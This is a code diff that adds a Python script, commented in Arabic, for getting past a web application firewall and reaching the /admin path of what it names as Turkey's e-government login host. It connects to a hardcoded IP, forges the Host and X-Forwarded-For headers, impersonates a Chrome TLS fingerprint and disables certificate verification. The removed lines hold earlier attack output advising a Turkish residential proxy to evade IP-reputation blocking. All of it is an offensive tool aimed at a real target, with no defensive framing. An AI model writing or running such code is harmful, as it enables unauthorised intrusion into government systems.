@@ -1,5 +1,51 @@
-Executing Header Smuggling on: /admin
-[+] Status: 406
-[-] Critical: WAF is still rejecting based on Source IP Reputation.
-[*] Advice: You MUST use a Turkish Residential Proxy to proceed.
-                                            
+import asyncio
+from curl_cffi.requests import AsyncSession
+
+class AbyssGhostStrike:
+    def __init__(self):
+        # العنوان الفعلي للسيرفر (الذي حصلنا عليه من Nmap)
+        self.target_ip = "94.55.118.66"
+        # الدومين الذي نحاول الوصول إليه (بافتراض أنه turkiye.gov.tr أو مشابه)
+        self.real_host = "giris.turkiye.gov.tr" 
+
+    async def ghost_request(self, path):
+        # المحاولة هنا هي الاتصال بـ IP السيرفر مباشرة
+        # لكن إيهام الـ WAF أننا نطلب موقعاً موثوقاً في مرحلة الـ TLS
+        url = f"https://{self.target_ip}{path}"
+        
+        headers = {
+            "Host": self.real_host,
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
+            "X-Forwarded-For": "127.0.0.1", # محاولة الإيهام بأن الطلب داخلي (Loopback)
+            "Accept": "*/*"
+        }
+
+        async with AsyncSession(verify=False) as session:
+            print(f"[*] Attempting SNI/Host Smuggling on {self.target_ip}...")
+            try:
+                # السر هنا: الـ TLS Handshake يتم مع IP السيرفر
+                # والـ Host Header يقول للسيرفر "أريد صفحة الـ admin"
+                resp = await session.get(
+                    url,
+                    headers=headers,
+                    impersonate="chrome124",
+                    timeout=20
+                )
+                
+                print(f"[+] Final Status: {resp.status_code}")
+                
+                if resp.status_code == 200:
+                    print("[!!!] BYPASS SUCCESSFUL! The WAF was bypassed via Host Injection.")
+                elif resp.status_code == 406:
+                    print("[-] Failure: Still 406. Geofencing is enforced at the Network Level.")
+                elif resp.status_code == 404:
+                    print("[-] 404: The Host Header was accepted but the path doesn't exist on this Node.")
+                else:
+                    print(f"[-] Code: {resp.status_code}")
+
+            except Exception as e:
+                print(f"[-] Connection Error: {e}")
+
+if __name__ == "__main__":
+    strike = AbyssGhostStrike()
+    asyncio.run(strike.ghost_request("/admin"))
